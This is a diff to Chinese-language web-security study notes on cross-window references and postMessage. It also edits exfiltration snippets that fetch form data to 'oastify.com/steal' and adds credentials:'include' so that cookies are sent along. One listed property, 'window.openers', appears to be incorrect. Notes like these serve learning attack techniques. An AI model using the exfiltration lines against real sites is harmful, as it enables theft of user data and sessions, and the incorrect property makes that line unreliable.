@@ -310,6 +310,7 @@ fetch("https://oastify.com/steal?" + form_params, {mode: 'no-cors'});
 fetch("https://oastify.com/steal", {
     method: "POST",
     mode: 'no-cors', 
+    credentials: 'include',
     body: form_data_obj
 });
 
@@ -390,7 +391,13 @@ oauth 身份验证为一系列在应用程序与验证服务器之间的设置�
 
 比较 `Window.self` 与 `window.top` 是否相同来区分父页面与子框架
 
-## message
+窗口使用
+- `window.opener`   引用它打开的新窗口
+- `window.openers`  引用生成当前窗口的窗口
+- `window.frames`   引用嵌入的iframe
+- `window.parent`   引用当前iframe的父窗口
+
+## postMessage —— 在不同来源的页面之间发送数据
 
 https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage
 
@@ -400,7 +407,16 @@ https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage
 otherWindow.postMessage(message, targetOrigin, [transfer]);
 ```
 - `targetOrigin`
-    通过窗口的 origin 属性来指定哪些窗口能接收到消息事件，其值可以是字符串"*"（表示无限制）或者一个 URI。
+    通过窗口的 origin 属性来指定哪些窗口能接收到消息事件，其值可以是字符串"*"（表示**无限制**）或者一个 URI。
+
+同时，目标窗口设置一个事件监听器来处理它接收到的数据：
+
+```javascript
+function parse_data(event) {
+    // Parse the data
+}
+window.addEventListener("message", parse_data);
+```
 
 ## 其他
 
